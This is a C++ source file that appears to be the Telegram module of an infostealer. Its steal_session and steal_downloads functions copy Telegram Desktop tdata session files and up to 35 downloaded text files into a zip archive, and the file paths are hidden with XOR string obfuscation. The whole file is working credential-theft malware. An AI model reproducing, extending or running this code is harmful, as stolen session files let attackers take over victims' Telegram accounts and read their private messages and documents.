#include "telegram.h"

#include "../../winapi/winapi.h"

#include "../../utilities/crt/crt.h"
#include "../../utilities/xor/xor.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/zip_handle/zip_handle.h"
#include "../../utilities/directories/directories.h"

#include <filesystem>

telegram g_tg;

void telegram::steal_session(std::string path)
{
	std::string a = path.c_str() + std::string(XOR_STRING("A7FDF864FBC10B7*"));
	std::string a1 = path.c_str() + std::string(XOR_STRING("A92DAA6EA6F891F*"));
	std::string d = path.c_str() + std::string(XOR_STRING("D877F783D5D3EF8*"));
	std::string f = path.c_str() + std::string(XOR_STRING("F8806DD0C461824*"));

	if (g_tools.check_directory(path.c_str()) == DIR_FOUNDED) {
		WIN32_FIND_DATA file_data;
		HANDLE handle = g_winapi.FindFirstFileA(d.c_str(), &file_data);

		std::string account_dir = path.c_str() + std::string(file_data.cFileName) + std::string(XOR_STRING("\\"));
		if (g_tools.check_directory(account_dir.c_str()) == DIR_FOUNDED)
		{
			for (auto &p : std::filesystem::directory_iterator(account_dir.c_str()))
			{
				std::string from = account_dir.c_str() + p.path().stem().string();
				std::string file_name = std::string(XOR_STRING("Messengers/Telegram")) + std::string(XOR_STRING("/")) +
					std::string(file_data.cFileName) + std::string(XOR_STRING("/")) + p.path().stem().string();

				std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

				g_zip.write_zip(file_name.c_str(), buffer);
			}
		}

		if (handle) {
			g_winapi.CloseHandle(handle);
		}
	}

	if (g_tools.check_directory(path.c_str()) == DIR_FOUNDED) {
		WIN32_FIND_DATA file_data;
		HANDLE handle = g_winapi.FindFirstFileA(a.c_str(), &file_data);

		std::string account_dir = path.c_str() + std::string(file_data.cFileName) + std::string(XOR_STRING("\\"));
		if (g_tools.check_directory(account_dir.c_str()) == DIR_FOUNDED)
		{
			for (auto &p : std::filesystem::directory_iterator(account_dir.c_str()))
			{
				std::string from = account_dir.c_str() + p.path().stem().string();
				std::string file_name = std::string(XOR_STRING("Messengers/Telegram")) + std::string(XOR_STRING("/")) +
					std::string(file_data.cFileName) + std::string(XOR_STRING("/")) + p.path().stem().string();

				std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

				g_zip.write_zip(file_name.c_str(), buffer);
			}
		}

		if (handle) {
			g_winapi.CloseHandle(handle);
		}
	}

	if (g_tools.check_directory(path.c_str()) == DIR_FOUNDED) {
		WIN32_FIND_DATA file_data;
		HANDLE handle = g_winapi.FindFirstFileA(a1.c_str(), &file_data);

		std::string account_dir = path.c_str() + std::string(file_data.cFileName) + std::string(XOR_STRING("\\"));
		if (g_tools.check_directory(account_dir.c_str()) == DIR_FOUNDED)
		{
			for (auto &p : std::filesystem::directory_iterator(account_dir.c_str()))
			{
				std::string from = account_dir.c_str() + p.path().stem().string();
				std::string file_name = std::string(XOR_STRING("Messengers/Telegram")) + std::string(XOR_STRING("/")) +
					std::string(file_data.cFileName) + std::string(XOR_STRING("/")) + p.path().stem().string();

				std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

				g_zip.write_zip(file_name.c_str(), buffer);
			}
		}

		if (handle) {
			g_winapi.CloseHandle(handle);
		}
	}

	if (g_tools.check_directory(path.c_str()) == DIR_FOUNDED) {
		WIN32_FIND_DATA file_data;
		HANDLE handle = g_winapi.FindFirstFileA(f.c_str(), &file_data);

		std::string account_dir = path.c_str() + std::string(file_data.cFileName) + std::string(XOR_STRING("\\"));
		if (g_tools.check_directory(account_dir.c_str()) == DIR_FOUNDED)
		{
			for (auto &p : std::filesystem::directory_iterator(account_dir.c_str()))
			{
				std::string from = account_dir.c_str() + p.path().stem().string();
				std::string file_name = std::string(XOR_STRING("Messengers/Telegram")) + std::string(XOR_STRING("/")) +
					std::string(file_data.cFileName) + std::string(XOR_STRING("/")) + p.path().stem().string();

				std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

				g_zip.write_zip(file_name.c_str(), buffer);
			}
		}

		if (handle) {
			g_winapi.CloseHandle(handle);
		}
	}

	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		if (!p.is_directory() && p.path().extension().empty())
		{
			if (p.path().filename() == XOR_STRING("shortcuts-custom"))
			{
				continue;
			}
			else if (p.path().filename() == XOR_STRING("shortcuts-default"))
			{
				continue;
			}
			else if (p.path().filename() == XOR_STRING("working"))
			{
				continue;
			}
			else
			{
				std::string from = path.c_str() + p.path().stem().string();
				std::string file_name = std::string(XOR_STRING("Messengers/Telegram")) + std::string(XOR_STRING("/")) + p.path().stem().string();

				std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

				g_zip.write_zip(file_name.c_str(), buffer);
			}
		}
	}
}

void telegram::steal_downloads(std::string path)
{
	int m_hTextFileCount = 35;

	for (auto &a : std::filesystem::recursive_directory_iterator(path.c_str()))
	{
		if (a.path().extension() == XOR_STRING(".txt"))
		{
			if (m_hTextFileCount > 0)
			{
				std::string from = path.c_str() + a.path().stem().string() + std::string(XOR_STRING(".txt"));
				std::string file_name = std::string(XOR_STRING("Telegram Downloads/")) + a.path().stem().string() + std::string(XOR_STRING(".txt"));
				std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

				g_zip.write_zip(file_name.c_str(), buffer);

				m_hTextFileCount--;
			}
		}
	}
}

void telegram::run()
{
	std::string user_name = g_tools.get_user_name();
	std::string system_disk = g_tools.get_system_disk();

	std::string telegram_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Telegram Desktop\\"));
	std::string tdata_dir = telegram_dir + std::string(XOR_STRING("tdata\\"));

	std::string tg_downloads_dir = g_dir.get_downloads() + std::string(XOR_STRING("Telegram Desktop\\"));

	if (g_tools.check_directory(tdata_dir.c_str()) == DIR_FOUNDED)
	{
		steal_session(tdata_dir.c_str());
	}

	if (g_tools.check_directory(tg_downloads_dir.c_str()) == DIR_FOUNDED)
	{
		steal_downloads(tg_downloads_dir.c_str());
	}
}